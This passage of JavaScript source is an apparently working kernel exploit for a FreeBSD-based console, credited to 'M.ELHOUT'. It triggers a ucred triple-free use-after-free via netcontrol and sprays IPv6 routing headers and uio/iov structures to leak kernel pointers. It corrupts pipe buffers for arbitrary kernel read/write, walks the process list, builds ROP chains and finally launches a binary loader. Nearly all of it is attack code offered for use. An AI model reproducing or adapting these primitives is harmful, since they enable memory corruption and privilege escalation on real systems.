      if (typeof show_fail === 'function') {
        show_fail();
      }
    }
  }, 0);
}
var exploit_count = 0;
var exploit_end = false;
function netctrl_exploit() {
  setup_log_screen();
  var supported_fw = init();
  if (!supported_fw) {
    return;
  }
  log('Setting up exploit...');
  yield_to_render(exploit_phase_setup);
}
function exploit_phase_setup() {
  var ok = setup();
  if (!ok) {
    log('Setup failed, aborting exploit.');
    cleanup();
    return;
  }
  log('Workers spawned');
  exploit_count = 0;
  exploit_end = false;
  yield_to_render(exploit_phase_trigger);
}
function exploit_phase_trigger() {
  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W');
    cleanup();
    return;
  }
  exploit_count++;
  log('Triggering Retrying... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
  if (!trigger_ucred_triplefree()) {
    yield_to_render(exploit_phase_trigger);
    return;
  }
  log('Leaking Exploit...');
  yield_to_render(exploit_phase_leak);
}
function exploit_phase_leak() {
  if (!leak_kqueue_safe()) {
    log('[leak_kqueue_safe] failed, retrying...');
    yield_to_render(exploit_phase_trigger);
    return;
  }
  
  log(' Exploit Read/Write...');
  log(' Stability by M.ELHOUT...');
  yield_to_render(exploit_phase_rw);
}
function exploit_phase_rw() {
  setup_arbitrary_rw();
  utils.notify('Jailbreak Success');
  utils.notify('M.ELHOUT');
}
function exploit_phase_jailbreak() {
  jailbreak();
}
function setup_arbitrary_rw() {
  log(' Exploit Read/Write...');

  // 1) تأكيد إن kq_fdp صالح
  if (kq_fdp.eq(0)) {
    cleanup();
    throw new Error(' Jailbreak failed - invalid kq_fdp');
  }

  // 2) قراءة fd_files
  var fd_files = kreadslow64_safe(kq_fdp);
  if (fd_files.eq(BigInt_Error)) {
    cleanup();
    throw new Error(' Jailbreak failed - fd_files leak failed');
  }

  fdt_ofiles = fd_files;

  // 3) تأكيد صلاحية master/victim pipes
  if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
    cleanup();
    throw new Error(' Jailbreak failed - invalid pipe fds');
  }

  // 4) قراءة file pointers
  master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
  victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));

  if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
    cleanup();
    throw new Error(' Jailbreak failed - pipe file leak failed');
  }

  // 5) قراءة pipe data
  master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
  victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));

  if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
    cleanup();
    throw new Error(' Jailbreak failed - pipe data leak failed');
  }

  // 6) تأكيد إن pipe data valid
  if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
    cleanup();
    throw new Error(' Jailbreak failed - invalid pipe data');
  }

  // 7) تعديل pipebuf
  write32(master_pipe_buf.add(0x00), 0);
  write32(master_pipe_buf.add(0x04), 0);
  write32(master_pipe_buf.add(0x08), 0);
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);

  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if (ret_write.eq(BigInt_Error)) {
    cleanup();
    throw new Error(' Jailbreak failed - pipebuf write failed');
  }

  // 8) زيادة refcount
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));

  // 9) تنظيف rthdr
  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
  remove_rthr_from_socket(ipv6_socks[triplets[2]]);

  // 10) إزالة الملف الثلاثي freed
  remove_uaf_file();

  // 11) نجاح
  log('Arbitrary R/W achieved');

  // 12) انتقال نظيف
  yield_to_render(exploit_phase_jailbreak);
}

function find_allproc() {
  // Use existing master_pipe instead of creating new one
  var pipe_0 = master_pipe[0];
  var pipe_1 = master_pipe[1];

  if (pipe_0 < 0 || pipe_1 < 0) {
    return new BigInt(0);
  }

  debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
  var pid = Number(getpid());
  debug('find_allproc - pid: ' + pid);

  debug('find_allproc - Writing pid to sockopt_val_buf...');
  write32(sockopt_val_buf, pid);

  debug('find_allproc - Calling ioctl FIOSETOWN...');
  var ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf);
  debug('find_allproc - ioctl returned: ' + ioctl_ret);

  debug('find_allproc - Getting fp...');
  var fp = fget(pipe_0);
  debug('find_allproc - fp: ' + hex(fp));

  debug('find_allproc - Reading f_data...');
  var f_data = kread64(fp.add(0x00));
  debug('find_allproc - f_data: ' + hex(f_data));

  debug('find_allproc - Reading pipe_sigio...');
  var pipe_sigio = kread64(f_data.add(0xd0));
  debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio));

  debug('find_allproc - Reading p...');
  var p = kread64(pipe_sigio);
  debug('find_allproc - initial p: ' + hex(p));

  kernel.addr.curproc = p; // Set global curproc

  var walk_count = 0;
  var mask = new BigInt(0xFFFFFFFF, 0x00000000);

  while (!p.and(mask).eq(mask)) {
    p = kread64(p.add(0x08)); // p_list.le_prev
    walk_count++;
    if (walk_count % 100 === 0) {
      debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p));
    }
  }

  debug('find_allproc - Found allproc after ' + walk_count + ' iterations');

  // Don't close - using master_pipe which we need
  return p;
}
function jailbreak() {
  debug('jailbreak - Starting...');

  // حراسة على الـ offsets والـ FW
  if (!kernel_offset) {
    log('jailbreak: kernel_offset not loaded');
    throw new Error('Kernel offsets not loaded');
  }
  if (FW_VERSION === null) {
    log('jailbreak: FW_VERSION is null');
    throw new Error('FW_VERSION is null');
  }

  // Stabilize
  for (var i = 0; i < 10; i++) {
    sched_yield();
  }

  debug('jailbreak - Calling find_allproc...');
  kernel.addr.allproc = find_allproc();
  debug('allproc: ' + hex(kernel.addr.allproc));

  // Calculate kernel base
  if (!kl_lock || kl_lock.eq(0)) {
    log('jailbreak: kl_lock is invalid');
    throw new Error('kl_lock is invalid');
  }

  kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
  log('Kernel base: ' + hex(kernel.addr.base));

  // المنطق المشترك حسب الـ FW
  jailbreak_shared(FW_VERSION);

  log('Jailbreak Complete - JAILBROKEN');

  // Cleanup من غير قتل الـ workers بقوة
  cleanup(false);

  show_success();
  run_binloader();
}
function fhold(fp) {
  // زيادة f_count مع حراسة بسيطة
  if (fp.eq(0)) {
    log('fhold: invalid fp (0)');
    return;
  }
  var count = kread32(fp.add(0x28)); // f_count
  kwrite32(fp.add(0x28), count + 1);
}

function fget(fd) {
  // حراسة على fd
  if (fd < 0) {
    log('fget: invalid fd ' + fd);
    return new BigInt(0);
  }
  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
}

function remove_rthr_from_socket(fd) {
  // In case last triplet was not found in kwriteslow
  // At this point we don't care about twins/triplets
  if (fd <= 0) {
    log('remove_rthr_from_socket: invalid fd ' + fd);
    return;
  }

  var fp = fget(fd);
  if (fp.eq(0)) {
    log('remove_rthr_from_socket: fget returned 0 for fd ' + fd);
    return;
  }

  var f_data = kread64(fp.add(0x00));
  var so_pcb = kread64(f_data.add(0x18));
  var in6p_outputopts = kread64(so_pcb.add(0x118));
  kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
}

var victim_pipe_buf = malloc(PIPEBUF_SIZE);

function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
  if (buffer.eq(0)) {
    throw new Error('buffer cannot be zero');
  }
  if (size <= 0 || size > PAGE_SIZE) {
    log('corrupt_pipe_buf: invalid size ' + size);
    return BigInt_Error;
  }

  write32(victim_pipe_buf.add(0x00), cnt);   // cnt
  write32(victim_pipe_buf.add(0x04), _in);   // in
  write32(victim_pipe_buf.add(0x08), out);   // out
  write32(victim_pipe_buf.add(0x0C), size);  // size
  write64(victim_pipe_buf.add(0x10), buffer); // buffer

  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
}

function kwrite(dest, src, n) {
  if (dest.eq(0) || src.eq(0) || n <= 0) {
    log('kwrite: invalid dest/src/size');
    return BigInt_Error;
  }

  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  return write(new BigInt(victimWpipeFd), src, n);
}

function kread(dest, src, n) {
  debug('Enter kread for src: ' + hex(src));

  if (dest.eq(0) || src.eq(0) || n <= 0) {
    log('kread: invalid dest/src/size');
    return BigInt_Error;
  }

  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  read(new BigInt(victimRpipeFd), dest, n);
}
function kwrite64(addr, val) {
  if (addr.eq(0)) {
    log('kwrite64: invalid addr 0');
    return;
  }
  write64(tmp, val);
  kwrite(addr, tmp, 8);
}

function kwrite32(addr, val) {
  if (addr.eq(0)) {
    log('kwrite32: invalid addr 0');
    return;
  }
  write32(tmp, val);
  kwrite(addr, tmp, 4);
}

function kread64(addr) {
  if (addr.eq(0)) {
    log('kread64: invalid addr 0');
    return new BigInt(0);
  }
  kread(tmp, addr, 8);
  return read64(tmp);
}

function kread32(addr) {
  if (addr.eq(0)) {
    log('kread32: invalid addr 0');
    return 0;
  }
  kread(tmp, addr, 4);
  return read32(tmp);
}

function read_buffer(addr, len) {
  if (addr.eq(0) || len <= 0) {
    log('read_buffer: invalid addr/len');
    return new Uint8Array(0);
  }
  var buffer = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)));
  }
  return buffer;
}

function write_buffer(addr, buffer) {
  if (addr.eq(0) || !buffer || buffer.length === 0) {
    log('write_buffer: invalid addr/buffer');
    return;
  }
  for (var i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]);
  }
}

// Functions used in global kernel.js
kernel.read_buffer = function (kaddr, len) {
  if (kaddr.eq(0) || len <= 0) {
    log('kernel.read_buffer: invalid kaddr/len');
    return new Uint8Array(0);
  }
  kread(tmp, kaddr, len);
  return read_buffer(tmp, len);
};

kernel.write_buffer = function (kaddr, buf) {
  if (kaddr.eq(0) || !buf || buf.length === 0) {
    log('kernel.write_buffer: invalid kaddr/buf');
    return;
  }
  write_buffer(tmp, buf);
  kwrite(kaddr, tmp, buf.length);
};

function remove_uaf_file() {
  if (uaf_socket === undefined) {
    throw new Error('uaf_socket is undefined');
  }

  if (uaf_socket < 0) {
    log('remove_uaf_file: invalid uaf_socket');
    return;
  }

  var uafFile = fget(uaf_socket);
  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));

  var removed = 0;

  for (var i = 0; i < 0x1000; i++) {
    var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));

    if (s <= 0) {
      continue;
    }

    if (fget(s).eq(uafFile)) {
      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
      removed++;
    }

    close(new BigInt(s));

    if (removed === 3) {
      break;
    }
  }
}
// ثوابت بدل الأرقام السحرية
var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 2000;

function trigger_ucred_triplefree() {
  var end = false;

  // msgIov كما في الأصلي
  write64(msgIov.add(0x0), 1);
  write64(msgIov.add(0x8), 1);

  var main_count = 0;

  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++;

    // 1) dummy socket → register in netcontrol
    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
    close(new BigInt(dummy_socket));

    // 2) allocate new ucred
    setuid(1);

    // 3) reclaim fd → uaf_socket
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));

    // 4) free previous ucred
    setuid(1);

    // 5) unregister → free file + ucred
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);

    // 6) محاولة إصلاح refcount بشكل خفيف
    for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
      trigger_iov_recvmsg();
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
    }

    // 7) double free أول مرة
    close(dup(new BigInt(uaf_socket)));

    // 8) إيجاد التوأم
    end = find_twins();
    if (!end) {
      twins[0] = -1;
      twins[1] = -1;
      close(new BigInt(uaf_socket));
      continue;
    }

    log('Triple Free Running...');

    // 9) free واحدة من التوأم
    free_rthdr(ipv6_socks[twins[1]]);

    // 10) انتظار refcount = 1 لكن بدون لوب مجنونة
    var count = 0;
    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
      trigger_iov_recvmsg();

      write32(leak_rthdr.add(0x04), 0);
      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);

      if (read32(leak_rthdr) === 1)
        break;

      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);

      count++;
    }

    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
      twins[0] = -1;
      twins[1] = -1;
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }

    triplets[0] = twins[0];

    // 11) triple free فعليًا
    close(dup(new BigInt(uaf_socket)));

    // 12) إيجاد triplet 1
    triplets[1] = find_triplet(triplets[0], -1);
    if (triplets[1] === -1) {
      twins[0] = -1;
      twins[1] = -1;
      write(new BigInt(iov_sock_1), tmp, 1);
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }

    write(new BigInt(iov_sock_1), tmp, 1);

    // 13) إيجاد triplet 2
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] === -1) {
      twins[0] = -1;
      twins[1] = -1;
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }

    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  if (main_count === TRIPLEFREE_ITERATIONS) {
    log('Failed to Triple Free');
    return false;
  }

  return true;
}
function leak_kqueue() {

  // نحرر triplets[1] عشان نستخدمه في التسريب
  free_rthdr(ipv6_socks[triplets[1]]);

  var kq = new BigInt(0);
  var magic_val = new BigInt(0x0, 0x1430000);
  var magic_add = leak_rthdr.add(0x08);
  var count = 0;
  var MAX_KQ = 5000;

  while (count < MAX_KQ) {
    count++;

    kq = kqueue();
    if (kq.eq(BigInt_Error)) {
      return false;
    }

    // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
    write64(magic_add, 0);
    write64(leak_rthdr.add(0x98), 0);

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);

    var magic = read64(magic_add);
    var fdp   = read64(leak_rthdr.add(0x98));

    if (magic.eq(magic_val) && !fdp.eq(0)) {
      break;
    }

    close(kq);
    sched_yield();
  }

  if (count >= MAX_KQ) {
    log('leak_kqueue: exceeded MAX_KQ iterations');
    return false;
  }

  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp  = read64(leak_rthdr.add(0x98));

  if (kq_fdp.eq(0)) {
    return false;
  }

  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));

  close(kq);

  // إعادة بناء triplets[1] بعد ما استخدمناه في free
  triplets[1] = find_triplet(triplets[0], triplets[2]);

  return true;
}

function leak_kqueue_safe() {
  try {
    return leak_kqueue();
  } catch (e) {
    log('leak_kqueue_safe ERROR: ' + e.message);
    return false;
  }
}
function kreadslow64(address) {

  if (address.eq(0)) {
    return BigInt_Error;
  }

  var buffer = kreadslow(address, 8);
  if (buffer.eq(BigInt_Error)) {
    cleanup();
    throw new Error(' Jailbreak failed - Reboot and try again');
  }
  return read64(buffer);
}

function kreadslow64_safe(address) {

  if (address.eq(0)) {
    return BigInt_Error;
  }

  var buffer = kreadslow(address, 8);
  if (buffer.eq(BigInt_Error)) {
    cleanup();
    throw new Error(' Jailbreak failed - Reboot and try again');
  }
  return read64(buffer);
}
function build_uio(uio, uio_iov, uio_td, read, addr, size) {
  write64(uio.add(0x00), uio_iov);          // uio_iov
  write64(uio.add(0x08), UIO_IOV_NUM);      // uio_iovcnt
  write64(uio.add(0x10), BigInt_Error);     // uio_offset
  write64(uio.add(0x18), size);             // uio_resid
  write32(uio.add(0x20), UIO_SYSSPACE);     // uio_segflg
  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
  write64(uio.add(0x28), uio_td);           // uio_td
  write64(uio.add(0x30), addr);             // iov_base
  write64(uio.add(0x38), size);             // iov_len
}
var KREAD_MAX_KQ = 10000; // بدل 10000 الهاردكود

function kreadslow(addr, size) {
  debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);

  if (addr.eq(0) || size <= 0) {
    return BigInt_Error;
  }

  // Memory exhaustion check
  if (debugging.info.memory.available === 0) {
    log('kreadslow - Memory exhausted before start');
    cleanup();
    return BigInt_Error;
  }

  // Prepare leak buffers.
  var leak_buffers = new Array(UIO_THREAD_NUM);
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    leak_buffers[i] = malloc(size);
    if (!leak_buffers[i]) {
      log('kreadslow - malloc leak_buffers[' + i + '] failed');
      return BigInt_Error;
    }
  }

  // Set send buf size.
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  // Fill queue.
  write(new BigInt(uio_sock_1), tmp, size);

  // Set iov length
  write64(uioIovRead.add(0x08), size);
  debug('kreadslow - Freeing triplets[1]=' + triplets[1]);

  // تأكيد صلاحية triplets[1]
  if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
    return BigInt_Error;
  }

  // Free one.
  free_rthdr(ipv6_socks[triplets[1]]);

  // Minimize footprint
  var uio_leak_add = leak_rthdr.add(0x08);
  debug('kreadslow - Starting uio reclaim loop...');
  var count = 0;
  var zeroMemoryCount = 0;

  // Reclaim with uio.
  while (count < KREAD_MAX_KQ) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log(' Jailbreak failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }
    count++;
    if (count % 100 === 1) {
      debug('kreadslow - uio loop iter ' + count);
    }

    trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }

    // Wake up all threads.
    read(new BigInt(uio_sock_0), tmp, size);
    for (var _i12 = 0; _i12 < UIO_THREAD_NUM; _i12++) {
      read(new BigInt(uio_sock_0), leak_buffers[_i12], size);
    }
    wait_uio_writev();

    // Fill queue.
    write(new BigInt(uio_sock_1), tmp, size);
  }

  if (count >= KREAD_MAX_KQ) {
    debug('kreadslow - Failed uio reclaim after ' + count + ' iterations');
    return BigInt_Error;
  }

  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
  var uio_iov = read64(leak_rthdr);
  debug('kreadslow - uio_iov: ' + hex(uio_iov));

  // Prepare uio reclaim buffer.
  build_uio(msgIov, uio_iov, 0, true, addr, size);
  debug('kreadslow - Freeing triplets[2]=' + triplets[2]);

  // تأكيد صلاحية triplets[2]
  if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
    return BigInt_Error;
  }

  // Free second one.
  free_rthdr(ipv6_socks[triplets[2]]);

  // Minimize footprint
  var iov_leak_add = leak_rthdr.add(0x20);
  debug('kreadslow - Starting iov reclaim loop...');

  // Reclaim uio with iov.
  var zeroMemoryCount2 = 0;
  var count2 = 0;
  while (true) {
    count2++;
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log(' Jailbreak failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }

    // Reclaim with iov.
    trigger_iov_recvmsg();
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations');
      break;
    }

    // Release iov spray.
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }


  // Wake up all threads.
  read(new BigInt(uio_sock_0), tmp, size);

  // Read the results now.
  var leak_buffer = new BigInt(0);
  var tag_val = new BigInt(0x41414141, 0x41414141);

  // Get leak.
  for (var _i13 = 0; _i13 < UIO_THREAD_NUM; _i13++) {
    read(new BigInt(uio_sock_0), leak_buffers[_i13], size);
    var val = read64(leak_buffers[_i13]);
    debug('kreadslow - leak_buffers[' + _i13 + ']: ' + hex(val));
    if (!val.eq(tag_val)) {
      // Find triplet.
      triplets[1] = find_triplet(triplets[0], -1);
      debug('kreadslow - triplets[1]=' + triplets[1]);
      leak_buffer = leak_buffers[_i13].add(0);
    }
  }

  // Workers should have finished earlier no need to wait
  wait_uio_writev();

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1);

  if (leak_buffer.eq(0)) {
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }


  // Find triplet[2].
  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    debug('kreadslow - triplets[2] retry ' + (retry + 1));
    sched_yield();
  }

  debug('kreadslow - triplets[2]=' + triplets[2]);
  if (triplets[2] === -1) {
    debug('kreadslow - Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  // Workers should have finished earlier no need to wait
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer));
  return leak_buffer;
}
function kwriteslow(addr, buffer, size) {

  // حراسة على المدخلات
  if (addr.eq(0) || size <= 0) {
    return BigInt_Error;
  }
  if (buffer.eq(0)) {
    log('kwriteslow: buffer cannot be zero');
    return BigInt_Error;
  }

  // تأكيد صلاحية triplets[1] و triplets[2] قبل الاستخدام
  if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
    return BigInt_Error;
  }
  if (triplets[0] < 0 || triplets[0] >= ipv6_socks.length) {
    return BigInt_Error;
  }

  // Set send buf size.
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  // Set iov length.
  write64(uioIovWrite.add(0x08), size);

  // Free first triplet.
  free_rthdr(ipv6_socks[triplets[1]]);

  // Minimize footprint
  var uio_leak_add = leak_rthdr.add(0x08);

  // Reclaim with uio.
  var zeroMemoryCount = 0;
  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log(' Jailbreak failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }

    trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      // debug("Break on reclaim with uio");
      break;
    }

    // Wake up all threads.
    for (var i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size);
    }
    wait_uio_readv();
  }

  var uio_iov = read64(leak_rthdr);
  // debug("This is uio_iov: " + hex(uio_iov));

  // Prepare uio reclaim buffer.
  build_uio(msgIov, uio_iov, 0, false, addr, size);

  // تأكيد صلاحية triplets[2] قبل الـ free
  if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
    return BigInt_Error;
  }

  // Free second one.
  free_rthdr(ipv6_socks[triplets[2]]);

  // Minimize footprint
  var iov_leak_add = leak_rthdr.add(0x20);

  // Reclaim uio with iov.
  var zeroMemoryCount2 = 0;
  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log(' Jailbreak failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }

    // Reclaim with iov.
    trigger_iov_recvmsg();
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      // debug("Break on reclaim uio with iov");
      break;
    }

    // Release iov spray.
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  // Corrupt data.
  for (var _i14 = 0; _i14 < UIO_THREAD_NUM; _i14++) {
    write(new BigInt(uio_sock_1), buffer, size);
  }

  // Find triplet.
  triplets[1] = find_triplet(triplets[0], -1);

  // Workers should have finished earlier no need to wait
  wait_uio_readv();

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1);

  // Find triplet[2].
  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    sched_yield();
  }
  if (triplets[2] === -1) {
    debug('kwriteslow - Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  // Workers should have finished earlier no need to wait
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  return new BigInt(0);
}
function rop_regen_and_loop(last_rop_entry, number_entries) {
  var new_rop_entry = last_rop_entry.add(8);
  var copy_entry = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add
  var rop_loop = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add

  for (var i = 0; i < number_entries; i++) {
    var entry_add = copy_entry;
    var entry_val = read64(copy_entry);
    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
    write64(new_rop_entry.add(0x8), entry_add);
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
    write64(new_rop_entry.add(0x18), entry_val);
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
    copy_entry = copy_entry.add(8);
    new_rop_entry = new_rop_entry.add(0x28);
  }

  // Time to jump back
  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
  write64(new_rop_entry.add(0x8), rop_loop);
}
function spawn_thread(rop_array, loop_entries, predefinedStack) {
  var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);

  // const rop_addr = malloc(size); // ROP Stack plus extra size

  // Fill ROP Stack
  for (var i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]);
    // debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
  }

  // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
  // loop_entries indicates the number of stack entries we need to regenerate
  if (loop_entries !== 0) {
    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8); // We pass the add of the last ROP instruction
    rop_regen_and_loop(last_rop_entry, loop_entries);
    // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
  }
  var jmpbuf = malloc(0x60);

  // FreeBSD amd64 jmp_buf layout:
  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
  write64(jmpbuf.add(0x00), gadgets.RET); // RIP - ret gadget
  write64(jmpbuf.add(0x10), rop_addr); // RSP - pivot to ROP chain
  write32(jmpbuf.add(0x40), saved_fpu_ctrl); // FPU control
  write32(jmpbuf.add(0x44), saved_mxcsr); // MXCSR

  var stack_size = new BigInt(0x100);
  var tls_size = new BigInt(0x40);
  var stack = malloc(Number(stack_size));
  var tls = malloc(Number(tls_size));
  write64(spawn_thr_args.add(0x00), longjmp_addr); // start_func = longjmp
  write64(spawn_thr_args.add(0x08), jmpbuf); // arg = jmpbuf
  write64(spawn_thr_args.add(0x10), stack); // stack_base
  write64(spawn_thr_args.add(0x18), stack_size); // stack_size
  write64(spawn_thr_args.add(0x20), tls); // tls_base
  write64(spawn_thr_args.add(0x28), tls_size); // tls_size
  write64(spawn_thr_args.add(0x30), spawn_tid); // child_tid (output)
  write64(spawn_thr_args.add(0x38), spawn_cpid); // parent_tid (output)

  var result = thr_new(spawn_thr_args, 0x68);
  // debug("thr_new result: " + hex(result));
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result));
  }
  return read64(spawn_tid);
}
function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
